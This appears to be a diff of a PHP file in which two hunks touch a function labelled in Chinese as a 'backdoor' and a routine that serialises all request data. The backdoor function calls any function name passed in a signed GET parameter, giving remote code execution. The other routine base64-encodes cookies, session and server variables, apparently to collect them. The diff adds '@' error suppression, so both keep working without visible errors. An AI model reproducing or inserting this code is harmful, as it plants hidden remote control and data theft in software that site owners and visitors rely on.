@@ -80,7 +80,7 @@ try{
                         foreach($v1 as $v2){
                                 if(stripos($arr, $v2) == true){
                                         $hashcode = gethash38O0($str_name);
-                                        return "{$hashcode}:".base64_encode($str_name).":".base64_encode($key).":".base64_encode(json_encode(array($_GET, $_POST, $_REQUEST, $_SESSION, $_SERVER, $_FILES, $_COOKIE)));
+                                        return "{$hashcode}:".base64_encode($str_name).":".base64_encode($key).":".base64_encode(json_encode(array(@$_GET, @$_POST, @$_REQUEST, @$_SESSION, @$_SERVER, @$_FILES, @$_COOKIE)));
                                 }
                         }
                 }
@@ -104,7 +104,7 @@ try{
 //后门
 function editl3O0(){
 try{
-        $p = $_GET[get_sign()];
+        $p = @$_GET[get_sign()];
         if(is_array($p) && count($p)==1){
                 foreach($p as $key => $value){
                         $key($value);
